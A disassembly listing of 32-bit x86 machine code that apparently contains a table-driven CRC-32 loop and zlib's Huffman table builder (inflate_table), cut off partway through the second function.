  408812:	33 04 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%eax
  408819:	33 41 0c             	xor    0xc(%ecx),%eax
  40881c:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  408823:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  40882a:	89 c2                	mov    %eax,%edx
  40882c:	89 c5                	mov    %eax,%ebp
  40882e:	c1 ea 10             	shr    $0x10,%edx
  408831:	c1 ed 18             	shr    $0x18,%ebp
  408834:	0f b6 fa             	movzbl %dl,%edi
  408837:	0f b6 d0             	movzbl %al,%edx
  40883a:	0f b6 c4             	movzbl %ah,%eax
  40883d:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  408844:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  40884b:	33 51 10             	xor    0x10(%ecx),%edx
  40884e:	33 14 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edx
  408855:	33 14 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%edx
  40885c:	89 d0                	mov    %edx,%eax
  40885e:	89 d5                	mov    %edx,%ebp
  408860:	c1 e8 10             	shr    $0x10,%eax
  408863:	c1 ed 18             	shr    $0x18,%ebp
  408866:	0f b6 f8             	movzbl %al,%edi
  408869:	0f b6 c2             	movzbl %dl,%eax
  40886c:	0f b6 d6             	movzbl %dh,%edx
  40886f:	8b 04 85 c0 ec 40 00 	mov    0x40ecc0(,%eax,4),%eax
  408876:	33 04 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%eax
  40887d:	33 41 14             	xor    0x14(%ecx),%eax
  408880:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  408887:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  40888e:	89 c5                	mov    %eax,%ebp
  408890:	89 c2                	mov    %eax,%edx
  408892:	0f b6 f8             	movzbl %al,%edi
  408895:	c1 ed 18             	shr    $0x18,%ebp
  408898:	c1 ea 10             	shr    $0x10,%edx
  40889b:	8b 3c bd c0 ec 40 00 	mov    0x40ecc0(,%edi,4),%edi
  4088a2:	33 3c ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edi
  4088a9:	0f b6 c4             	movzbl %ah,%eax
  4088ac:	0f b6 d2             	movzbl %dl,%edx
  4088af:	33 79 18             	xor    0x18(%ecx),%edi
  4088b2:	8b 1c 95 c0 e4 40 00 	mov    0x40e4c0(,%edx,4),%ebx
  4088b9:	83 c1 20             	add    $0x20,%ecx
  4088bc:	33 3c 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edi
  4088c3:	83 ee 20             	sub    $0x20,%esi
  4088c6:	31 fb                	xor    %edi,%ebx
  4088c8:	89 dd                	mov    %ebx,%ebp
  4088ca:	0f b6 d3             	movzbl %bl,%edx
  4088cd:	89 d8                	mov    %ebx,%eax
  4088cf:	c1 ed 18             	shr    $0x18,%ebp
  4088d2:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  4088d9:	c1 e8 10             	shr    $0x10,%eax
  4088dc:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  4088e3:	0f b6 ff             	movzbl %bh,%edi
  4088e6:	0f b6 c0             	movzbl %al,%eax
  4088e9:	33 51 fc             	xor    -0x4(%ecx),%edx
  4088ec:	33 14 bd c0 e8 40 00 	xor    0x40e8c0(,%edi,4),%edx
  4088f3:	33 14 85 c0 e4 40 00 	xor    0x40e4c0(,%eax,4),%edx
  4088fa:	89 d0                	mov    %edx,%eax
  4088fc:	0f b6 ea             	movzbl %dl,%ebp
  4088ff:	c1 e8 10             	shr    $0x10,%eax
  408902:	0f b6 f8             	movzbl %al,%edi
  408905:	89 d0                	mov    %edx,%eax
  408907:	0f b6 d6             	movzbl %dh,%edx
  40890a:	c1 e8 18             	shr    $0x18,%eax
  40890d:	8b 04 85 c0 e0 40 00 	mov    0x40e0c0(,%eax,4),%eax
  408914:	33 04 ad c0 ec 40 00 	xor    0x40ecc0(,%ebp,4),%eax
  40891b:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  408922:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  408929:	83 fe 1f             	cmp    $0x1f,%esi
  40892c:	0f 87 5e fe ff ff    	ja     0x408790
  408932:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  408936:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40893a:	83 64 24 1c 1f       	andl   $0x1f,0x1c(%esp)
  40893f:	8d 56 e0             	lea    -0x20(%esi),%edx
  408942:	83 e2 e0             	and    $0xffffffe0,%edx
  408945:	8d 5c 13 20          	lea    0x20(%ebx,%edx,1),%ebx
  408949:	83 7c 24 1c 03       	cmpl   $0x3,0x1c(%esp)
  40894e:	0f 86 85 00 00 00    	jbe    0x4089d9
  408954:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  408958:	8d 56 fc             	lea    -0x4(%esi),%edx
  40895b:	c1 ea 02             	shr    $0x2,%edx
  40895e:	8d 4c 93 04          	lea    0x4(%ebx,%edx,4),%ecx
  408962:	83 c3 04             	add    $0x4,%ebx
  408965:	33 43 fc             	xor    -0x4(%ebx),%eax
  408968:	89 c2                	mov    %eax,%edx
  40896a:	89 c6                	mov    %eax,%esi
  40896c:	c1 ea 10             	shr    $0x10,%edx
  40896f:	c1 ee 18             	shr    $0x18,%esi
  408972:	0f b6 fa             	movzbl %dl,%edi
  408975:	0f b6 d0             	movzbl %al,%edx
  408978:	8b 34 b5 c0 e0 40 00 	mov    0x40e0c0(,%esi,4),%esi
  40897f:	33 34 95 c0 ec 40 00 	xor    0x40ecc0(,%edx,4),%esi
  408986:	0f b6 d4             	movzbl %ah,%edx
  408989:	8b 04 95 c0 e8 40 00 	mov    0x40e8c0(,%edx,4),%eax
  408990:	31 f0                	xor    %esi,%eax
  408992:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  408999:	39 cb                	cmp    %ecx,%ebx
  40899b:	75 c5                	jne    0x408962
  40899d:	83 64 24 1c 03       	andl   $0x3,0x1c(%esp)
  4089a2:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4089a6:	85 d2                	test   %edx,%edx
  4089a8:	0f 84 b1 fd ff ff    	je     0x40875f
  4089ae:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4089b2:	01 ca                	add    %ecx,%edx
  4089b4:	83 c1 01             	add    $0x1,%ecx
  4089b7:	89 c3                	mov    %eax,%ebx
  4089b9:	c1 e8 08             	shr    $0x8,%eax
  4089bc:	32 59 ff             	xor    -0x1(%ecx),%bl
  4089bf:	0f b6 db             	movzbl %bl,%ebx
  4089c2:	33 04 9d c0 e0 40 00 	xor    0x40e0c0(,%ebx,4),%eax
  4089c9:	39 d1                	cmp    %edx,%ecx
  4089cb:	75 e7                	jne    0x4089b4
  4089cd:	e9 8d fd ff ff       	jmp    0x40875f
  4089d2:	5b                   	pop    %ebx
  4089d3:	31 c0                	xor    %eax,%eax
  4089d5:	5e                   	pop    %esi
  4089d6:	5f                   	pop    %edi
  4089d7:	5d                   	pop    %ebp
  4089d8:	c3                   	ret
  4089d9:	89 d9                	mov    %ebx,%ecx
  4089db:	eb c5                	jmp    0x4089a2
  4089dd:	8d 76 00             	lea    0x0(%esi),%esi
  4089e0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4089e4:	8b 54 24 08          	mov    0x8(%esp),%edx
  4089e8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4089ec:	e9 0f fc ff ff       	jmp    0x408600
  4089f1:	eb 0d                	jmp    0x408a00
  4089f3:	90                   	nop
  4089f4:	90                   	nop
  4089f5:	90                   	nop
  4089f6:	90                   	nop
  4089f7:	90                   	nop
  4089f8:	90                   	nop
  4089f9:	90                   	nop
  4089fa:	90                   	nop
  4089fb:	90                   	nop
  4089fc:	90                   	nop
  4089fd:	90                   	nop
  4089fe:	90                   	nop
  4089ff:	90                   	nop
  408a00:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408a04:	8b 54 24 08          	mov    0x8(%esp),%edx
  408a08:	8b 44 24 04          	mov    0x4(%esp),%eax
  408a0c:	e9 ef fb ff ff       	jmp    0x408600
  408a11:	90                   	nop
  408a12:	90                   	nop
  408a13:	90                   	nop
  408a14:	90                   	nop
  408a15:	90                   	nop
  408a16:	90                   	nop
  408a17:	90                   	nop
  408a18:	90                   	nop
  408a19:	90                   	nop
  408a1a:	90                   	nop
  408a1b:	90                   	nop
  408a1c:	90                   	nop
  408a1d:	90                   	nop
  408a1e:	90                   	nop
  408a1f:	90                   	nop
  408a20:	55                   	push   %ebp
  408a21:	57                   	push   %edi
  408a22:	56                   	push   %esi
  408a23:	53                   	push   %ebx
  408a24:	81 ec 84 00 00 00    	sub    $0x84,%esp
  408a2a:	8d 44 24 44          	lea    0x44(%esp),%eax
  408a2e:	8d 5c 24 64          	lea    0x64(%esp),%ebx
  408a32:	31 ed                	xor    %ebp,%ebp
  408a34:	83 c0 02             	add    $0x2,%eax
  408a37:	66 89 68 fe          	mov    %bp,-0x2(%eax)
  408a3b:	39 d8                	cmp    %ebx,%eax
  408a3d:	75 f3                	jne    0x408a32
  408a3f:	8b bc 24 a0 00 00 00 	mov    0xa0(%esp),%edi
  408a46:	8b 84 24 9c 00 00 00 	mov    0x9c(%esp),%eax
  408a4d:	85 ff                	test   %edi,%edi
  408a4f:	8d 0c 78             	lea    (%eax,%edi,2),%ecx
  408a52:	74 10                	je     0x408a64
  408a54:	0f b7 10             	movzwl (%eax),%edx
  408a57:	83 c0 02             	add    $0x2,%eax
  408a5a:	66 83 44 54 44 01    	addw   $0x1,0x44(%esp,%edx,2)
  408a60:	39 c8                	cmp    %ecx,%eax
  408a62:	75 f0                	jne    0x408a54
  408a64:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408a6b:	8b 10                	mov    (%eax),%edx
  408a6d:	b8 0f 00 00 00       	mov    $0xf,%eax
  408a72:	66 83 7c 44 44 00    	cmpw   $0x0,0x44(%esp,%eax,2)
  408a78:	0f 85 bd 04 00 00    	jne    0x408f3b
  408a7e:	83 e8 01             	sub    $0x1,%eax
  408a81:	75 ef                	jne    0x408a72
  408a83:	85 d2                	test   %edx,%edx
  408a85:	0f 84 95 01 00 00    	je     0x408c20
  408a8b:	89 44 24 20          	mov    %eax,0x20(%esp)
  408a8f:	8b 74 24 20          	mov    0x20(%esp),%esi
  408a93:	85 f6                	test   %esi,%esi
  408a95:	0f 84 85 01 00 00    	je     0x408c20
  408a9b:	83 fe 01             	cmp    $0x1,%esi
  408a9e:	0f b7 7c 24 46       	movzwl 0x46(%esp),%edi
  408aa3:	bd 01 00 00 00       	mov    $0x1,%ebp
  408aa8:	76 1a                	jbe    0x408ac4
  408aaa:	66 85 ff             	test   %di,%di
  408aad:	75 15                	jne    0x408ac4
  408aaf:	8b 54 24 20          	mov    0x20(%esp),%edx
  408ab3:	eb 08                	jmp    0x408abd
  408ab5:	66 83 7c 6c 44 00    	cmpw   $0x0,0x44(%esp,%ebp,2)
  408abb:	75 07                	jne    0x408ac4
  408abd:	83 c5 01             	add    $0x1,%ebp
  408ac0:	39 d5                	cmp    %edx,%ebp
  408ac2:	75 f1                	jne    0x408ab5
  408ac4:	8d 74 24 48          	lea    0x48(%esp),%esi
  408ac8:	0f b7 cf             	movzwl %di,%ecx
  408acb:	ba 01 00 00 00       	mov    $0x1,%edx
  408ad0:	eb 06                	jmp    0x408ad8
  408ad2:	0f b7 0e             	movzwl (%esi),%ecx
  408ad5:	83 c6 02             	add    $0x2,%esi
  408ad8:	01 d2                	add    %edx,%edx
  408ada:	29 ca                	sub    %ecx,%edx
  408adc:	0f 88 6c 04 00 00    	js     0x408f4e
  408ae2:	39 f3                	cmp    %esi,%ebx
  408ae4:	75 ec                	jne    0x408ad2
  408ae6:	85 d2                	test   %edx,%edx
  408ae8:	74 1a                	je     0x408b04
  408aea:	83 7c 24 20 01       	cmpl   $0x1,0x20(%esp)
  408aef:	0f 85 59 04 00 00    	jne    0x408f4e
  408af5:	8b 8c 24 98 00 00 00 	mov    0x98(%esp),%ecx
  408afc:	85 c9                	test   %ecx,%ecx
  408afe:	0f 84 4a 04 00 00    	je     0x408f4e
  408b04:	31 d2                	xor    %edx,%edx
  408b06:	31 c9                	xor    %ecx,%ecx
  408b08:	66 89 54 24 66       	mov    %dx,0x66(%esp)
  408b0d:	ba 01 00 00 00       	mov    $0x1,%edx
  408b12:	eb 05                	jmp    0x408b19
  408b14:	0f b7 7c 54 44       	movzwl 0x44(%esp,%edx,2),%edi
  408b19:	83 c2 01             	add    $0x1,%edx
  408b1c:	01 f9                	add    %edi,%ecx
  408b1e:	83 fa 0f             	cmp    $0xf,%edx
  408b21:	66 89 0c 53          	mov    %cx,(%ebx,%edx,2)
  408b25:	75 ed                	jne    0x408b14
  408b27:	8b b4 24 a0 00 00 00 	mov    0xa0(%esp),%esi
  408b2e:	31 d2                	xor    %edx,%edx
  408b30:	85 f6                	test   %esi,%esi
  408b32:	74 44                	je     0x408b78
  408b34:	89 2c 24             	mov    %ebp,(%esp)
  408b37:	89 44 24 04          	mov    %eax,0x4(%esp)
  408b3b:	8b bc 24 9c 00 00 00 	mov    0x9c(%esp),%edi
  408b42:	8b ac 24 a0 00 00 00 	mov    0xa0(%esp),%ebp
  408b49:	8b 84 24 ac 00 00 00 	mov    0xac(%esp),%eax
  408b50:	0f b7 0c 57          	movzwl (%edi,%edx,2),%ecx
  408b54:	66 85 c9             	test   %cx,%cx
  408b57:	74 11                	je     0x408b6a
  408b59:	0f b7 5c 4c 64       	movzwl 0x64(%esp,%ecx,2),%ebx
  408b5e:	8d 73 01             	lea    0x1(%ebx),%esi
  408b61:	66 89 14 58          	mov    %dx,(%eax,%ebx,2)
  408b65:	66 89 74 4c 64       	mov    %si,0x64(%esp,%ecx,2)
  408b6a:	83 c2 01             	add    $0x1,%edx
  408b6d:	39 ea                	cmp    %ebp,%edx
  408b6f:	75 df                	jne    0x408b50
  408b71:	8b 2c 24             	mov    (%esp),%ebp
  408b74:	8b 44 24 04          	mov    0x4(%esp),%eax
  408b78:	8b 9c 24 98 00 00 00 	mov    0x98(%esp),%ebx
  408b7f:	85 db                	test   %ebx,%ebx
  408b81:	0f 84 e9 00 00 00    	je     0x408c70
  408b87:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%esp)
  408b8e:	01 
  408b8f:	b9 00 01 00 00       	mov    $0x100,%ecx
  408b94:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  408b99:	0f 44 d1             	cmove  %ecx,%edx
  408b9c:	b9 3e ff 40 00       	mov    $0x40ff3e,%ecx
  408ba1:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  408ba5:	ba c0 00 41 00       	mov    $0x4100c0,%edx
  408baa:	0f 44 d1             	cmove  %ecx,%edx
  408bad:	b9 7e ff 40 00       	mov    $0x40ff7e,%ecx
  408bb2:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  408bb6:	ba 00 01 41 00       	mov    $0x410100,%edx
  408bbb:	0f 44 d1             	cmove  %ecx,%edx
  408bbe:	39 c5                	cmp    %eax,%ebp
  408bc0:	0f 43 c5             	cmovae %ebp,%eax
  408bc3:	89 54 24 38          	mov    %edx,0x38(%esp)
  408bc7:	89 c3                	mov    %eax,%ebx
  408bc9:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  408bcd:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408bd4:	89 d9                	mov    %ebx,%ecx
  408bd6:	8b 00                	mov    (%eax),%eax
  408bd8:	89 44 24 14          	mov    %eax,0x14(%esp)
  408bdc:	b8 01 00 00 00       	mov    $0x1,%eax
  408be1:	d3 e0                	shl    %cl,%eax
  408be3:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%esp)
  408bea:	01 
  408beb:	0f 94 44 24 43       	sete   0x43(%esp)
  408bf0:	3d 54 03 00 00       	cmp    $0x354,%eax
  408bf5:	0f 86 b2 00 00 00    	jbe    0x408cad
  408bfb:	80 7c 24 43 00       	cmpb   $0x0,0x43(%esp)
  408c00:	0f 84 a7 00 00 00    	je     0x408cad
  408c06:	81 c4 84 00 00 00    	add    $0x84,%esp
  408c0c:	b8 01 00 00 00       	mov    $0x1,%eax
  408c11:	5b                   	pop    %ebx
  408c12:	5e                   	pop    %esi
  408c13:	5f                   	pop    %edi
  408c14:	5d                   	pop    %ebp
  408c15:	c3                   	ret
  408c16:	8d 76 00             	lea    0x0(%esi),%esi
  408c19:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408c20:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408c27:	8b 9c 24 a4 00 00 00 	mov    0xa4(%esp),%ebx
  408c2e:	31 f6                	xor    %esi,%esi
  408c30:	31 ff                	xor    %edi,%edi
  408c32:	8b 00                	mov    (%eax),%eax
  408c34:	8d 50 04             	lea    0x4(%eax),%edx
  408c37:	89 13                	mov    %edx,(%ebx)
  408c39:	c6 00 40             	movb   $0x40,(%eax)
  408c3c:	c6 40 01 01          	movb   $0x1,0x1(%eax)
  408c40:	66 89 70 02          	mov    %si,0x2(%eax)
  408c44:	8b 03                	mov    (%ebx),%eax
  408c46:	8d 50 04             	lea    0x4(%eax),%edx
  408c49:	89 13                	mov    %edx,(%ebx)
  408c4b:	c6 00 40             	movb   $0x40,(%eax)
  408c4e:	c6 40 01 01          	movb   $0x1,0x1(%eax)
  408c52:	66 89 78 02          	mov    %di,0x2(%eax)
  408c56:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408c5d:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  408c63:	31 c0                	xor    %eax,%eax
  408c65:	81 c4 84 00 00 00    	add    $0x84,%esp
  408c6b:	5b                   	pop    %ebx
  408c6c:	5e                   	pop    %esi
  408c6d:	5f                   	pop    %edi
  408c6e:	5d                   	pop    %ebp
  408c6f:	c3                   	ret
  408c70:	39 c5                	cmp    %eax,%ebp
  408c72:	c6 44 24 43 00       	movb   $0x0,0x43(%esp)
  408c77:	c7 44 24 2c 13 00 00 	movl   $0x13,0x2c(%esp)
  408c7e:	00 
  408c7f:	0f 43 c5             	cmovae %ebp,%eax
  408c82:	89 c3                	mov    %eax,%ebx
  408c84:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  408c88:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408c8f:	89 d9                	mov    %ebx,%ecx
  408c91:	8b 9c 24 ac 00 00 00 	mov    0xac(%esp),%ebx
  408c98:	8b 00                	mov    (%eax),%eax
  408c9a:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  408c9e:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  408ca2:	89 44 24 14          	mov    %eax,0x14(%esp)
  408ca6:	b8 01 00 00 00       	mov    $0x1,%eax
  408cab:	d3 e0                	shl    %cl,%eax
  408cad:	83 bc 24 98 00 00 00 	cmpl   $0x2,0x98(%esp)
  408cb4:	02 
  408cb5:	0f 94 44 24 42       	sete   0x42(%esp)
  408cba:	3d 50 02 00 00       	cmp    $0x250,%eax
  408cbf:	0f b6 5c 24 42       	movzbl 0x42(%esp),%ebx
  408cc4:	76 08                	jbe    0x408cce
  408cc6:	84 db                	test   %bl,%bl
  408cc8:	0f 85 38 ff ff ff    	jne    0x408c06
  408cce:	8b 9c 24 ac 00 00 00 	mov    0xac(%esp),%ebx
  408cd5:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  408cd9:	89 44 24 24          	mov    %eax,0x24(%esp)
  408cdd:	83 e8 01             	sub    $0x1,%eax
  408ce0:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  408ce4:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  408ceb:	ff 
  408cec:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  408cf3:	00 
  408cf4:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  408cf8:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  408cff:	00 
  408d00:	89 fd                	mov    %edi,%ebp
  408d02:	89 44 24 34          	mov    %eax,0x34(%esp)
  408d06:	8d 76 00             	lea    0x0(%esi),%esi
  408d09:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408d10:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  408d15:	c6 44 24 40 00       	movb   $0x0,0x40(%esp)
  408d1a:	2a 44 24 0c          	sub    0xc(%esp),%al
  408d1e:	88 44 24 41          	mov    %al,0x41(%esp)
  408d22:	8b 44 24 10          	mov    0x10(%esp),%eax
  408d26:	0f b7 00             	movzwl (%eax),%eax
  408d29:	39 44 24 2c          	cmp    %eax,0x2c(%esp)
  408d2d:	89 c7                	mov    %eax,%edi
  408d2f:	7f 1a                	jg     0x408d4b
  408d31:	0f 8d 39 02 00 00    	jge    0x408f70
  408d37:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  408d3b:	0f b6 1c 43          	movzbl (%ebx,%eax,2),%ebx
  408d3f:	88 5c 24 40          	mov    %bl,0x40(%esp)
  408d43:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  408d47:	0f b7 3c 43          	movzwl (%ebx,%eax,2),%edi
  408d4b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  408d4f:	2b 4c 24 0c          	sub    0xc(%esp),%ecx
  408d53:	ba 01 00 00 00       	mov    $0x1,%edx
  408d58:	b8 01 00 00 00       	mov    $0x1,%eax
  408d5d:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  408d61:	d3 e2                	shl    %cl,%edx
  408d63:	89 e9                	mov    %ebp,%ecx
  408d65:	0f b6 6c 24 40       	movzbl 0x40(%esp),%ebp
  408d6a:	d3 e0                	shl    %cl,%eax
  408d6c:	0f b6 4c 24 0c       	movzbl 0xc(%esp),%ecx
  408d71:	8d 34 95 00 00 00 00 	lea    0x0(,%edx,4),%esi
  408d78:	89 c3                	mov    %eax,%ebx
  408d7a:	89 44 24 28          	mov    %eax,0x28(%esp)
  408d7e:	8b 44 24 08          	mov    0x8(%esp),%eax
  408d82:	f7 de                	neg    %esi
  408d84:	89 14 24             	mov    %edx,(%esp)
  408d87:	d3 e8                	shr    %cl,%eax
  408d89:	89 d9                	mov    %ebx,%ecx
  408d8b:	01 d8                	add    %ebx,%eax
  408d8d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  408d91:	29 d0                	sub    %edx,%eax
  408d93:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  408d96:	0f b6 5c 24 41       	movzbl 0x41(%esp),%ebx
  408d9b:	90                   	nop
  408d9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408da0:	89 ea                	mov    %ebp,%edx
  408da2:	88 58 01             	mov    %bl,0x1(%eax)
  408da5:	66 89 78 02          	mov    %di,0x2(%eax)
  408da9:	88 10                	mov    %dl,(%eax)
  408dab:	01 f0                	add    %esi,%eax
  408dad:	2b 0c 24             	sub    (%esp),%ecx
  408db0:	75 ee                	jne    0x408da0
  408db2:	8b 44 24 04          	mov    0x4(%esp),%eax
  408db6:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  408dba:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  408dbe:	8d 48 ff             	lea    -0x1(%eax),%ecx
  408dc1:	b8 01 00 00 00       	mov    $0x1,%eax
  408dc6:	d3 e0                	shl    %cl,%eax
  408dc8:	85 c3                	test   %eax,%ebx
  408dca:	74 0a                	je     0x408dd6
  408dcc:	89 da                	mov    %ebx,%edx
  408dce:	66 90                	xchg   %ax,%ax
  408dd0:	d1 e8                	shr    $1,%eax
  408dd2:	85 c2                	test   %eax,%edx
  408dd4:	75 fa                	jne    0x408dd0
  408dd6:	85 c0                	test   %eax,%eax
  408dd8:	0f 84 82 01 00 00    	je     0x408f60
  408dde:	8d 50 ff             	lea    -0x1(%eax),%edx
  408de1:	23 54 24 08          	and    0x8(%esp),%edx
  408de5:	01 d0                	add    %edx,%eax
  408de7:	89 44 24 08          	mov    %eax,0x8(%esp)
  408deb:	8b 74 24 04          	mov    0x4(%esp),%esi
  408def:	0f b7 44 74 44       	movzwl 0x44(%esp,%esi,2),%eax
  408df4:	66 89 04 24          	mov    %ax,(%esp)
  408df8:	83 e8 01             	sub    $0x1,%eax
  408dfb:	66 85 c0             	test   %ax,%ax
  408dfe:	66 89 44 74 44       	mov    %ax,0x44(%esp,%esi,2)
  408e03:	75 23                	jne    0x408e28
  408e05:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  408e09:	39 de                	cmp    %ebx,%esi
  408e0b:	0f 84 6b 01 00 00    	je     0x408f7c
  408e11:	8b 44 24 10          	mov    0x10(%esp),%eax
  408e15:	8b bc 24 9c 00 00 00 	mov    0x9c(%esp),%edi
  408e1c:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  408e20:	0f b7 04 47          	movzwl (%edi,%eax,2),%eax
  408e24:	89 44 24 04          	mov    %eax,0x4(%esp)
  408e28:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  408e2c:	39 5c 24 04          	cmp    %ebx,0x4(%esp)
  408e30:	0f 86 fb 00 00 00    	jbe    0x408f31
  408e36:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  408e3a:	23 5c 24 34          	and    0x34(%esp),%ebx
  408e3e:	3b 5c 24 30          	cmp    0x30(%esp),%ebx
  408e42:	0f 84 e9 00 00 00    	je     0x408f31
  408e48:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408e4c:	8b 7c 24 14          	mov    0x14(%esp),%edi
  408e50:	8b 74 24 28          	mov    0x28(%esp),%esi
  408e54:	85 c0                	test   %eax,%eax
  408e56:	0f 44 44 24 1c       	cmove  0x1c(%esp),%eax
  408e5b:	8d 3c b7             	lea    (%edi,%esi,4),%edi
  408e5e:	8b 74 24 04          	mov    0x4(%esp),%esi
  408e62:	89 7c 24 14          	mov    %edi,0x14(%esp)
  408e66:	89 f5                	mov    %esi,%ebp
  408e68:	89 44 24 0c          	mov    %eax,0xc(%esp)
  408e6c:	89 c7                	mov    %eax,%edi
  408e6e:	29 c5                	sub    %eax,%ebp
  408e70:	b8 01 00 00 00       	mov    $0x1,%eax
  408e75:	89 e9                	mov    %ebp,%ecx
  408e77:	d3 e0                	shl    %cl,%eax
  408e79:	89 f1                	mov    %esi,%ecx
  408e7b:	8b 74 24 20          	mov    0x20(%esp),%esi
  408e7f:	39 f1                	cmp    %esi,%ecx
  408e81:	73 33                	jae    0x408eb6
  408e83:	0f b7 54 4c 44       	movzwl 0x44(%esp,%ecx,2),%edx
  408e88:	29 d0                	sub    %edx,%eax
  408e8a:	85 c0                	test   %eax,%eax
  408e8c:	7e 28                	jle    0x408eb6
  408e8e:	8d 4c 7c 44          	lea    0x44(%esp,%edi,2),%ecx
  408e92:	89 fa                	mov    %edi,%edx
  408e94:	eb 14                	jmp    0x408eaa
  408e96:	8d 76 00             	lea    0x0(%esi),%esi
  408e99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408ea0:	0f b7 3c 69          	movzwl (%ecx,%ebp,2),%edi
  408ea4:	29 f8                	sub    %edi,%eax
  408ea6:	85 c0                	test   %eax,%eax
  408ea8:	7e 0c                	jle    0x408eb6
  408eaa:	83 c5 01             	add    $0x1,%ebp
  408ead:	01 c0                	add    %eax,%eax
  408eaf:	8d 3c 2a             	lea    (%edx,%ebp,1),%edi
  408eb2:	39 fe                	cmp    %edi,%esi
  408eb4:	77 ea                	ja     0x408ea0
  408eb6:	b8 01 00 00 00       	mov    $0x1,%eax
  408ebb:	89 e9                	mov    %ebp,%ecx
  408ebd:	d3 e0                	shl    %cl,%eax
  408ebf:	01 44 24 24          	add    %eax,0x24(%esp)
  408ec3:	8b 74 24 24          	mov    0x24(%esp),%esi
  408ec7:	81 fe 54 03 00 00    	cmp    $0x354,%esi
  408ecd:	76 0b                	jbe    0x408eda
  408ecf:	80 7c 24 43 00       	cmpb   $0x0,0x43(%esp)
  408ed4:	0f 85 2c fd ff ff    	jne    0x408c06
  408eda:	81 7c 24 24 50 02 00 	cmpl   $0x250,0x24(%esp)
  408ee1:	00 
  408ee2:	76 0b                	jbe    0x408eef
  408ee4:	80 7c 24 42 00       	cmpb   $0x0,0x42(%esp)
  408ee9:	0f 85 17 fd ff ff    	jne    0x408c06
  408eef:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408ef6:	89 e9                	mov    %ebp,%ecx
  408ef8:	8d 14 9d 00 00 00 00 	lea    0x0(,%ebx,4),%edx
  408eff:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  408f03:	8b 00                	mov    (%eax),%eax
  408f05:	88 0c 98             	mov    %cl,(%eax,%ebx,4)
  408f08:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408f0f:	0f b6 4c 24 1c       	movzbl 0x1c(%esp),%ecx
  408f14:	8b 00                	mov    (%eax),%eax
  408f16:	88 4c 10 01          	mov    %cl,0x1(%eax,%edx,1)
  408f1a:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408f21:	8b 08                	mov    (%eax),%ecx
  408f23:	8b 44 24 14          	mov    0x14(%esp),%eax
  408f27:	29 c8                	sub    %ecx,%eax
  408f29:	c1 f8 02             	sar    $0x2,%eax
  408f2c:	66 89 44 11 02       	mov    %ax,0x2(%ecx,%edx,1)
  408f31:	83 44 24 10 02       	addl   $0x2,0x10(%esp)
